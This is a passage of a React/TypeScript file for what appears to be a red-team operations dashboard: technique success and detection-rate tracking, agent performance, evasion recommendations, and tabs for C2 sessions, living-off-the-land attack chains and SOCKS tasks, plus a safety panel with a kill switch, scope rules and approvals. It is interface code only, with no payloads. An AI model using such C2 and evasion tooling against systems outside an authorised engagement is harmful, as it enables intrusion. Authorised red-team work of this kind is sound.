            className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all capitalize ${subTab === t ? 'bg-[#f0c040]/20 text-[#f0c040] border border-[#f0c040]/30' : 'text-text-secondary hover:text-white'}`}>
            {t}
          </button>
        ))}
      </div>

      {/* Overview */}
      {subTab === 'overview' && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
            {[
              { label: 'Techniques Tracked', value: dashboard?.totalTechniquesTracked ?? techniqueScores.length, color: 'text-[#00d4ff]' },
              { label: 'Avg Success Rate', value: dashboard?.avgSuccessRate ? Math.round(dashboard.avgSuccessRate * 100) + '%' : 'N/A', color: 'text-green-400' },
              { label: 'Avg Detection Rate', value: dashboard?.avgDetectionRate ? Math.round(dashboard.avgDetectionRate * 100) + '%' : 'N/A', color: 'text-red-400' },
              { label: 'Active Agents', value: dashboard?.totalAgentsTracked ?? agentPerformance.length, color: 'text-[#f0c040]' },
            ].map(s => (
              <div key={s.label} className="bg-surface rounded-xl border border-border p-3">
                <div className="text-xs text-text-secondary mb-1">{s.label}</div>
                <div className={`text-xl font-bold font-mono ${s.color}`}>{s.value}</div>
              </div>
            ))}
          </div>

          {/* Top techniques + Worst detection */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
            <div className="bg-surface rounded-xl border border-border p-4">
              <h3 className="font-semibold text-sm mb-3">Top Techniques (Success Rate)</h3>
              {(dashboard?.topTechniques || techniqueScores.slice(0, 5)).map(t => (
                <div key={t.techniqueId} className="flex items-center justify-between py-1.5 border-b border-border last:border-0">
                  <div className="flex items-center gap-2">
                    <span className="font-mono text-xs text-[#00d4ff]">{t.techniqueId}</span>
                    <span className="text-sm">{t.techniqueName}</span>
                  </div>
                  <span className="font-mono text-sm text-green-400">{Math.round(t.successRate * 100)}%</span>
                </div>
              ))}
              {techniqueScores.length === 0 && <div className="text-center py-4 text-text-secondary text-sm">No technique data yet</div>}
            </div>
            <div className="bg-surface rounded-xl border border-border p-4">
              <h3 className="font-semibold text-sm mb-3">Highest Detection Rates</h3>
              {(dashboard?.worstDetectionRates || []).map(t => (
                <div key={t.techniqueId} className="flex items-center justify-between py-1.5 border-b border-border last:border-0">
                  <div className="flex items-center gap-2">
                    <span className="font-mono text-xs text-[#00d4ff]">{t.techniqueId}</span>
                    <span className="text-sm">{t.techniqueName}</span>
                  </div>
                  <span className="font-mono text-sm text-red-400">{Math.round(t.detectionRate * 100)}%</span>
                </div>
              ))}
              {(!dashboard?.worstDetectionRates || dashboard.worstDetectionRates.length === 0) && <div className="text-center py-4 text-text-secondary text-sm">No detection data yet</div>}
            </div>
          </div>
        </div>
      )}

      {/* Techniques */}
      {subTab === 'techniques' && (
        <div className="space-y-3">
          {techniqueScores.length === 0 ? (
            <div className="text-center py-12 text-text-secondary">
              <BarChart3 className="w-10 h-10 mx-auto mb-3 opacity-30" />
              <p className="text-sm">No technique scores yet. Execute techniques to start tracking.</p>
            </div>
          ) : techniqueScores.map(t => (
            <div key={t.techniqueId} className="bg-surface rounded-xl border border-border p-4">
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2">
                  <span className="font-mono text-sm font-bold text-[#00d4ff]">{t.techniqueId}</span>
                  <span className="font-semibold text-sm">{t.techniqueName}</span>
                  <span className="text-[10px] px-2 py-0.5 rounded-full border border-border text-text-secondary">{t.platform}</span>
                </div>
              </div>
              <div className="grid grid-cols-5 gap-4 text-xs">
                <div><span className="text-text-secondary">Success:</span> <span className="text-green-400 font-mono">{Math.round(t.successRate * 100)}%</span> <span className="text-[#333]">({t.successCount}/{t.successCount + t.failureCount})</span></div>
                <div><span className="text-text-secondary">Detection:</span> <span className="text-red-400 font-mono">{Math.round(t.detectionRate * 100)}%</span> <span className="text-[#333]">({t.detectionCount})</span></div>
                <div><span className="text-text-secondary">Avg Time:</span> <span className="font-mono">{t.avgExecutionTime.toFixed(1)}s</span></div>
                <div><span className="text-text-secondary">Uses:</span> <span className="font-mono">{t.successCount + t.failureCount}</span></div>
                <div><span className="text-text-secondary">Last:</span> <span className="font-mono text-[#555]">{t.lastUsed?.slice(0, 10) || 'never'}</span></div>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Agents */}
      {subTab === 'agents' && (
        <div className="space-y-3">
          {agentPerformance.length === 0 ? (
            <div className="text-center py-12 text-text-secondary">
              <Cpu className="w-10 h-10 mx-auto mb-3 opacity-30" />
              <p className="text-sm">No agent performance data yet.</p>
            </div>
          ) : agentPerformance.map(a => (
            <div key={a.agentId} className="bg-surface rounded-xl border border-border p-4">
              <div className="flex items-center justify-between mb-2">
                <span className="font-semibold">{a.agentName || a.agentId}</span>
                <span className="font-mono text-sm text-green-400">{Math.round(a.successRate * 100)}% success</span>
              </div>
              <div className="grid grid-cols-4 gap-3 text-xs">
                <div><span className="text-text-secondary">Tasks:</span> <span className="font-mono">{a.totalTasks}</span></div>
                <div><span className="text-text-secondary">Success:</span> <span className="font-mono text-green-400">{a.successfulTasks}</span></div>
                <div><span className="text-text-secondary">Failed:</span> <span className="font-mono text-red-400">{a.failedTasks}</span></div>
                <div><span className="text-text-secondary">Avg Duration:</span> <span className="font-mono">{a.avgTaskDuration.toFixed(1)}s</span></div>
              </div>
              <div className="flex items-center gap-4 mt-2 text-xs text-text-secondary">
                {a.mostUsedTechnique && <span>Most used: <span className="text-[#00d4ff]">{a.mostUsedTechnique}</span></span>}
                {a.bestPerformingTechnique && <span>Best: <span className="text-green-400">{a.bestPerformingTechnique}</span></span>}
                <span>Techniques: <span className="text-[#f0c040]">{a.techniquesKnown}</span></span>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Recommendations */}
      {subTab === 'recommendations' && (
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <h3 className="font-semibold text-sm">AI Recommendations</h3>
            <button onClick={() => generateRecommendations()} className="flex items-center gap-2 px-3 py-1.5 bg-[#f0c040]/20 text-[#f0c040] border border-[#f0c040]/30 rounded-lg text-xs hover:bg-[#f0c040]/30">
              <Zap className="w-3 h-3" /> Generate
            </button>
          </div>
          {recommendations.length === 0 ? (
            <div className="text-center py-12 text-text-secondary">
              <Zap className="w-10 h-10 mx-auto mb-3 opacity-30" />
              <p className="text-sm">No recommendations yet. Generate them based on your technique history.</p>
            </div>
          ) : recommendations.map(r => (
            <div key={r.id} className="bg-surface rounded-xl border border-border p-4">
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2">
                  <span className={`text-[10px] font-mono px-2 py-0.5 rounded-full border ${
                    r.type === 'technique' ? 'border-[#00d4ff]/30 bg-[#00d4ff]/10 text-[#00d4ff]' :
                    r.type === 'evasion' ? 'border-red-500/30 bg-red-500/10 text-red-400' :
                    r.type === 'chain' ? 'border-[#f0c040]/30 bg-[#f0c040]/10 text-[#f0c040]' :
                    'border-[#a78bfa]/30 bg-[#a78bfa]/10 text-[#a78bfa]'
                  }`}>{r.type}</span>
                  <span className="font-semibold text-sm">{r.title}</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="font-mono text-xs text-[#f0c040]">{Math.round(r.score)}/100</span>
                  <button onClick={() => dismissRecommendation(r.id)} className="text-text-secondary hover:text-red-400">
                    <X className="w-3.5 h-3.5" />
                  </button>
                </div>
              </div>
              <p className="text-xs text-text-secondary">{r.description}</p>
              {r.techniqueIds?.length > 0 && (
                <div className="flex items-center gap-1 mt-2">
                  {r.techniqueIds.map(id => (
                    <span key={id} className="text-[10px] font-mono px-1.5 py-0.5 rounded border border-[#00d4ff]/20 text-[#00d4ff]/60">{id}</span>
                  ))}
                </div>
              )}
            </div>
          ))}
        </div>
      )}

      {/* Discoveries */}
      {subTab === 'discoveries' && (
        <div className="space-y-3">
          {discoveries.length === 0 ? (
            <div className="text-center py-12 text-text-secondary">
              <Search className="w-10 h-10 mx-auto mb-3 opacity-30" />
              <p className="text-sm">No LOL technique discoveries yet.</p>
            </div>
          ) : discoveries.map(d => (
            <div key={d.id} className="bg-surface rounded-xl border border-border p-4">
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2">
                  <span className="font-mono text-sm font-bold">{d.binaryName}</span>
                  <span className="text-[10px] px-2 py-0.5 rounded-full border border-border text-text-secondary">{d.platform}</span>
                  <span className={`text-[10px] font-mono px-2 py-0.5 rounded-full border ${
                    d.status === 'approved' ? 'border-green-500/30 bg-green-500/10 text-green-400' :
                    d.status === 'rejected' ? 'border-red-500/30 bg-red-500/10 text-red-400' :
                    'border-yellow-500/30 bg-yellow-500/10 text-yellow-400'
                  }`}>{d.status}</span>
                </div>
                <span className="text-xs text-text-secondary">{d.source}</span>
              </div>
              <p className="text-xs text-text-secondary">{d.description}</p>
              {d.mitreIds?.length > 0 && (
                <div className="flex items-center gap-1 mt-2">
                  {d.mitreIds.map(id => (
                    <span key={id} className="text-[10px] font-mono px-1.5 py-0.5 rounded border border-[#00d4ff]/20 text-[#00d4ff]/60">{id}</span>
                  ))}
                </div>
              )}
            </div>
          ))}
        </div>
      )}
    </div>
  )
}

// ---- Safety Tab ----

function SafetyTab() {
  const { dashboard, validationRules, scopeRules, rateLimits, auditEntries, approvals, pendingCount, lastValidation, fetchDashboard, fetchValidationRules, fetchScopeRules, fetchRateLimits, fetchAuditEntries, fetchApprovals, validateTarget, reviewApproval, createScopeRule, deleteScopeRule } = useSafetyStore()
  const { killSwitch, toggleKillSwitch } = useRealtimeStore()
  const [subTab, setSubTab] = useState<'overview' | 'scope' | 'audit' | 'approvals' | 'rate-limits'>('overview')
  const [targetInput, setTargetInput] = useState('')

  useEffect(() => {
    fetchDashboard()
    fetchValidationRules()
    fetchScopeRules()
    fetchRateLimits()
    fetchAuditEntries({ limit: 50 })
    fetchApprovals()
  }, []) // eslint-disable-line react-hooks/exhaustive-deps

  const handleValidateTarget = async () => {
    if (!targetInput.trim()) return
    await validateTarget(targetInput.trim())
  }

  return (
    <div className="space-y-4">
      {/* Sub-tabs */}
      <div className="flex gap-1 bg-surface-light border border-border rounded-lg p-1">
        {(['overview', 'scope', 'audit', 'approvals', 'rate-limits'] as const).map(t => (
          <button key={t} onClick={() => setSubTab(t)}
            className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all capitalize ${subTab === t ? 'bg-red-500/20 text-red-400 border border-red-500/30' : 'text-text-secondary hover:text-white'}`}>
            {t === 'rate-limits' ? 'Rate Limits' : t}
            {t === 'approvals' && pendingCount > 0 && <span className="ml-1 px-1.5 py-0.5 rounded-full bg-red-500/20 text-red-400 text-[9px]">{pendingCount}</span>}
          </button>
        ))}
      </div>

      {/* Overview */}
      {subTab === 'overview' && (
        <div className="space-y-4">
          {/* Kill Switch Status */}
          <div className={`rounded-xl border p-4 flex items-center justify-between ${killSwitch?.active ? 'bg-red-500/10 border-red-500/30' : 'bg-green-500/10 border-green-500/30'}`}>
            <div className="flex items-center gap-3">
              <Shield className={`w-5 h-5 ${killSwitch?.active ? 'text-red-400' : 'text-green-400'}`} />
              <div>
                <span className={`font-bold ${killSwitch?.active ? 'text-red-400' : 'text-green-400'}`}>
                  Kill Switch: {killSwitch?.active ? 'ENGAGED' : 'DISENGAGED'}
                </span>
                <div className="text-xs text-text-secondary mt-0.5">
                  {killSwitch?.active ? 'All operations are halted' : 'Operations running normally'}
                </div>
              </div>
            </div>
            <button onClick={() => toggleKillSwitch(!killSwitch?.active)}
              className={`px-4 py-2 rounded-lg text-sm font-medium ${killSwitch?.active ? 'bg-green-500/20 border border-green-500/30 text-green-400' : 'bg-red-500/20 border border-red-500/30 text-red-400'}`}>
              {killSwitch?.active ? 'Disengage' : 'Engage Kill Switch'}
            </button>
          </div>

          {/* Quick Stats */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
            {[
              { label: 'Scope Rules', value: scopeRules.length, color: 'text-[#00d4ff]' },
              { label: 'Validation Rules', value: validationRules.length, color: 'text-[#f0c040]' },
              { label: 'Pending Approvals', value: pendingCount, color: pendingCount > 0 ? 'text-red-400' : 'text-green-400' },
              { label: 'Audit Entries', value: auditEntries.length, color: 'text-[#a78bfa]' },
            ].map(s => (
              <div key={s.label} className="bg-surface rounded-xl border border-border p-3">
                <div className="text-xs text-text-secondary mb-1">{s.label}</div>
                <div className={`text-xl font-bold font-mono ${s.color}`}>{s.value}</div>
              </div>
            ))}
          </div>

          {/* Target Validator */}
          <div className="bg-surface rounded-xl border border-border p-4">
            <h3 className="font-semibold text-sm mb-3">Target Validator</h3>
            <div className="flex gap-2">
              <input value={targetInput} onChange={e => setTargetInput(e.target.value)} placeholder="Enter IP, hostname, or CIDR..."
                className="flex-1 bg-surface-light border border-border rounded-lg px-3 py-2 text-sm font-mono"
                onKeyDown={e => e.key === 'Enter' && handleValidateTarget()} />
              <button onClick={handleValidateTarget} className="px-4 py-2 bg-[#f0c040]/20 text-[#f0c040] border border-[#f0c040]/30 rounded-lg text-sm hover:bg-[#f0c040]/30">
                Validate
              </button>
            </div>
            {lastValidation && (
              <div className={`mt-3 p-3 rounded-lg border ${
                lastValidation.status === 'allowed' ? 'bg-green-500/10 border-green-500/30' :
                lastValidation.status === 'blocked' ? 'bg-red-500/10 border-red-500/30' :
                'bg-yellow-500/10 border-yellow-500/30'
              }`}>
                <div className="flex items-center gap-2">
                  {lastValidation.status === 'allowed' ? <CheckCircle2 className="w-4 h-4 text-green-400" /> :
                   lastValidation.status === 'blocked' ? <X className="w-4 h-4 text-red-400" /> :
                   <AlertTriangle className="w-4 h-4 text-yellow-400" />}
                  <span className={`font-mono text-sm font-bold ${
                    lastValidation.status === 'allowed' ? 'text-green-400' : lastValidation.status === 'blocked' ? 'text-red-400' : 'text-yellow-400'
                  }`}>{lastValidation.status.toUpperCase()}</span>
                  <span className="text-sm text-text-secondary ml-2">{lastValidation.target}</span>
                </div>
                <p className="text-xs text-text-secondary mt-1">{lastValidation.reason}</p>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Scope Rules */}
      {subTab === 'scope' && (
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <h3 className="font-semibold text-sm">Scope Rules</h3>
          </div>
          {scopeRules.length === 0 ? (
            <div className="text-center py-12 text-text-secondary">
              <Globe className="w-10 h-10 mx-auto mb-3 opacity-30" />
              <p className="text-sm">No scope rules defined. Add rules to enforce target boundaries.</p>
            </div>
          ) : scopeRules.map(rule => (
            <div key={rule.id} className="bg-surface rounded-xl border border-border p-3 flex items-center justify-between">
              <div className="flex items-center gap-3">
                <span className={`text-[10px] font-mono px-2 py-0.5 rounded-full border ${
                  rule.type === 'include' ? 'border-green-500/30 bg-green-500/10 text-green-400' : 'border-red-500/30 bg-red-500/10 text-red-400'
                }`}>{rule.type}</span>
                <span className="font-mono text-sm">{rule.target}</span>
                <span className="text-xs text-text-secondary">{rule.description}</span>
              </div>
              <button onClick={() => deleteScopeRule(rule.id)} className="text-text-secondary hover:text-red-400">
                <Trash2 className="w-3.5 h-3.5" />
              </button>
            </div>
          ))}
        </div>
      )}

      {/* Audit Trail */}
      {subTab === 'audit' && (
        <div className="space-y-2">
          <h3 className="font-semibold text-sm">Audit Trail</h3>
          {auditEntries.length === 0 ? (
            <div className="text-center py-12 text-text-secondary text-sm">No audit entries yet.</div>
          ) : (
            <div className="bg-surface rounded-xl border border-border overflow-hidden">
              <div className="max-h-[500px] overflow-y-auto">
                {auditEntries.map(entry => (
                  <div key={entry.id} className="flex items-center gap-3 px-4 py-2 border-b border-border last:border-0 text-xs">
                    <span className="text-[#333] font-mono w-16 shrink-0">{entry.timestamp?.slice(11, 19) || '—'}</span>
                    <span className={`w-12 shrink-0 text-center ${
                      entry.severity === 'critical' ? 'text-red-400' : entry.severity === 'warning' ? 'text-yellow-400' : 'text-gray-400'
                    }`}>{entry.severity}</span>
                    <span className="text-[#00d4ff] font-mono w-24 shrink-0 truncate">{entry.username}</span>
                    <span className="text-text-secondary truncate">{entry.action} — {entry.resource}</span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {/* Approvals */}
      {subTab === 'approvals' && (
        <div className="space-y-3">
          <h3 className="font-semibold text-sm">Approval Requests</h3>
          {approvals.length === 0 ? (
            <div className="text-center py-12 text-text-secondary text-sm">No approval requests.</div>
          ) : approvals.map(req => (
            <div key={req.id} className="bg-surface rounded-xl border border-border p-4">
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2">
                  <span className={`text-[10px] font-mono px-2 py-0.5 rounded-full border ${
                    req.status === 'pending' ? 'border-yellow-500/30 bg-yellow-500/10 text-yellow-400' :
                    req.status === 'approved' ? 'border-green-500/30 bg-green-500/10 text-green-400' :
                    req.status === 'rejected' ? 'border-red-500/30 bg-red-500/10 text-red-400' :
                    'border-gray-500/30 bg-gray-500/10 text-gray-400'
                  }`}>{req.status}</span>
                  <span className="font-semibold text-sm">{req.title}</span>
                </div>
                {req.status === 'pending' && (
                  <div className="flex items-center gap-2">
                    <button onClick={() => reviewApproval(req.id, { status: 'approved', reviewedBy: 'operator' })}
                      className="px-3 py-1 text-xs bg-green-500/20 border border-green-500/30 text-green-400 rounded-lg hover:bg-green-500/30">Approve</button>
                    <button onClick={() => reviewApproval(req.id, { status: 'rejected', reviewedBy: 'operator' })}
                      className="px-3 py-1 text-xs bg-red-500/20 border border-red-500/30 text-red-400 rounded-lg hover:bg-red-500/30">Reject</button>
                  </div>
                )}
              </div>
              <p className="text-xs text-text-secondary">{req.description}</p>
              <div className="flex items-center gap-3 mt-2 text-[10px] text-text-secondary">
                <span>Type: {req.type}</span>
                <span>By: {req.requestedBy}</span>
                <span>At: {req.requestedAt?.slice(0, 16)}</span>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Rate Limits */}
      {subTab === 'rate-limits' && (
        <div className="space-y-3">
          <h3 className="font-semibold text-sm">Operation Rate Limits</h3>
          {rateLimits.length === 0 ? (
            <div className="text-center py-12 text-text-secondary text-sm">No rate limits configured.</div>
          ) : rateLimits.map(rl => (
            <div key={rl.id} className="bg-surface rounded-xl border border-border p-3">
              <div className="flex items-center justify-between mb-2">
                <span className="font-mono text-sm">{rl.operationType}</span>
                <span className={`text-[10px] font-mono px-2 py-0.5 rounded-full border ${rl.isLimited ? 'border-red-500/30 bg-red-500/10 text-red-400' : 'border-green-500/30 bg-green-500/10 text-green-400'}`}>
                  {rl.isLimited ? 'LIMITED' : 'OK'}
                </span>
              </div>
              <div className="grid grid-cols-3 gap-3 text-xs">
                <div><span className="text-text-secondary">Per Min:</span> <span className="font-mono">{rl.currentMinute}/{rl.maxPerMinute}</span></div>
                <div><span className="text-text-secondary">Per Hour:</span> <span className="font-mono">{rl.currentHour}/{rl.maxPerHour}</span></div>
                <div><span className="text-text-secondary">Concurrent:</span> <span className="font-mono">{rl.currentConcurrent}/{rl.maxConcurrent}</span></div>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  )
}

// ---- Main component ----

const TABS: Array<{ id: TabId; label: string; icon: React.ElementType }> = [
  { id: 'c2', label: 'C2 Sessions', icon: Radio },
  { id: 'c2-infra', label: 'C2 Infrastructure', icon: Server },
  { id: 'live-dashboard', label: 'Live Dashboard', icon: Activity },
  { id: 'campaigns', label: 'Campaigns', icon: Crosshair },
  { id: 'learning', label: 'Learning', icon: BarChart3 },
  { id: 'safety', label: 'Safety', icon: Shield },
  { id: 'lol-browser', label: 'LOL Browser', icon: Skull },
  { id: 'lol-chains', label: 'Attack Chains', icon: Link2 },
  { id: 'socks', label: 'SOCKS Tasks', icon: Network },
  { id: 'playbooks', label: 'Playbooks', icon: Layers },
  { id: 'neo4j', label: 'Neo4j / Graph', icon: Database },
  { id: 'parsers', label: 'File Parsers', icon: FileText },
  { id: 'search', label: 'Search', icon: Search },
  { id: 'analysis', label: 'AI Analysis', icon: Zap },
]

export default function RedTeam() {
  const [activeTab, setActiveTab] = useState<TabId>('c2')
  const [c2Servers, setC2Servers] = useState<C2Server[]>([])
  const [sessions, setSessions] = useState<Session[]>([])
  const [tasks, setTasks] = useState<SocksTask[]>([])
  const [playbooks, setPlaybooks] = useState<Playbook[]>(PLAYBOOK_TEMPLATES)
  const [findings, setFindings] = useState<Finding[]>([])
  const [parsers, setParsers] = useState<LogParser[]>([])

  // C2 Infrastructure & LOL stores
  const c2 = useC2Store()
  const lol = useLOLStore()
  const realtime = useRealtimeStore()
  const learning = useLearningStore()
  const safety = useSafetyStore()

  useEffect(() => {
    c2.fetchDashboard()
    c2.fetchFrameworks()
    lol.fetchStats()
    lol.fetchProjects()
    lol.fetchEntries()
    realtime.fetchAgentStatuses()
    realtime.fetchKillSwitch()
    learning.fetchDashboard()
    learning.fetchCampaigns()
    safety.fetchDashboard()
    safety.fetchPendingCount()
  }, []) // eslint-disable-line react-hooks/exhaustive-deps

  // Actions
  const addC2Server = (server: C2Server) => setC2Servers([...c2Servers, server])
  const removeC2Server = (id: string) => setC2Servers(c2Servers.filter(s => s.id !== id))
  const updateC2Server = (id: string, updates: Partial<C2Server>) => {
    setC2Servers(c2Servers.map(s => s.id === id ? { ...s, ...updates } : s))
  }

  const addSession = (session: Session) => setSessions([...sessions, session])
  const removeSession = (id: string) => setSessions(sessions.filter(s => s.id !== id))

  const addTask = (task: SocksTask) => setTasks([...tasks, task])
  const updateTask = (id: string, updates: Partial<SocksTask>) => {
    setTasks(tasks.map(t => t.id === id ? { ...t, ...updates } : t))
  }

  const addPlaybook = (playbook: Playbook) => setPlaybooks([...playbooks, playbook])
  const removePlaybook = (id: string) => setPlaybooks(playbooks.filter(p => p.id !== id))

  const addFinding = (finding: Finding) => setFindings([...findings, finding])
  const addParser = (parser: LogParser) => setParsers([...parsers, parser])

  const stats = [
    { label: 'Active Sessions', value: sessions.filter(s => s.status === 'active').length, icon: Terminal, color: 'text-green-400' },
    { label: 'C2 Frameworks', value: c2.frameworks.length, icon: Server, color: 'text-red-400' },
    { label: 'LOL Entries', value: lol.stats?.totalEntries ?? 0, icon: Skull, color: 'text-[#f0c040]' },
    { label: 'LOL Projects', value: lol.stats?.totalProjects ?? 0, icon: Globe, color: 'text-[#00d4ff]' },
    { label: 'Playbooks', value: playbooks.length, icon: Lock, color: 'text-yellow-400' },
    { label: 'Findings', value: findings.length, icon: AlertTriangle, color: 'text-red-400' },
  ]

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      className="h-full overflow-y-auto p-6"
    >
      {/* Header */}
      <div className="flex items-center justify-between mb-6">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-red-600/20 border border-red-500/30 flex items-center justify-center">
            <Swords className="w-5 h-5 text-red-400" />
          </div>
          <div>
            <h1 className="text-2xl font-bold">Red Team Operations</h1>
            <p className="text-text-secondary text-sm">C2 infrastructure, LOL integration (28 projects), attack chains & AI analysis</p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <div className="flex items-center gap-1.5 px-3 py-1.5 bg-green-500/10 border border-green-500/20 rounded-lg text-xs text-green-400">
            <div className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
            Engagement Active
          </div>
          <button className="flex items-center gap-2 px-4 py-2 bg-surface-light hover:bg-surface border border-border rounded-lg text-sm transition-colors">
            <BarChart3 className="w-4 h-4" />
            Report
          </button>
        </div>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4 mb-6">
        {stats.map(s => (
          <div key={s.label} className="bg-surface rounded-xl border border-border p-4">
            <div className={`flex items-center gap-2 mb-1 ${s.color}`}>
              <s.icon className="w-4 h-4" />
              <span className="text-xs text-text-secondary">{s.label}</span>
            </div>
            <div className="text-2xl font-bold">{s.value}</div>
          </div>
        ))}
      </div>

      {/* Tabs */}
      <div className="flex gap-1 bg-surface-light border border-border rounded-xl p-1 mb-6 overflow-x-auto">
        {TABS.map(tab => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id)}
            className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium transition-all whitespace-nowrap flex-shrink-0 ${
              activeTab === tab.id
                ? 'bg-red-600/20 text-red-400 border border-red-500/30'
                : 'text-text-secondary hover:text-text-primary'
            }`}
          >
            <tab.icon className="w-4 h-4" />
            {tab.label}
          </button>
        ))}
      </div>

      {/* Tab content */}
      <AnimatePresence mode="wait">
        <motion.div
          key={activeTab}
          initial={{ opacity: 0, y: 6 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -6 }}
          transition={{ duration: 0.15 }}
        >
          {activeTab === 'c2' && <C2Tab servers={c2Servers} sessions={sessions} setServers={setC2Servers} setSessions={setSessions} />}
          {activeTab === 'c2-infra' && <C2InfraTab />}
          {activeTab === 'live-dashboard' && <LiveDashboardTab />}
          {activeTab === 'campaigns' && <CampaignsTab />}
          {activeTab === 'learning' && <LearningTab />}
          {activeTab === 'safety' && <SafetyTab />}
          {activeTab === 'lol-browser' && <LOLBrowserTab />}
          {activeTab === 'lol-chains' && <LOLChainsTab />}
          {activeTab === 'socks' && <SocksTasksTab sessions={sessions} tasks={tasks} setTasks={setTasks} />}
          {activeTab === 'playbooks' && <PlaybooksTab playbooks={playbooks} setPlaybooks={setPlaybooks} />}
          {activeTab === 'neo4j' && <Neo4jTab />}
          {activeTab === 'parsers' && <ParsersTab parsers={parsers} setParsers={setParsers} />}
          {activeTab === 'search' && <SearchTab />}
          {activeTab === 'analysis' && <AnalysisTab findings={findings} setFindings={setFindings} />}
        </motion.div>
      </AnimatePresence>
    </motion.div>
  )
}
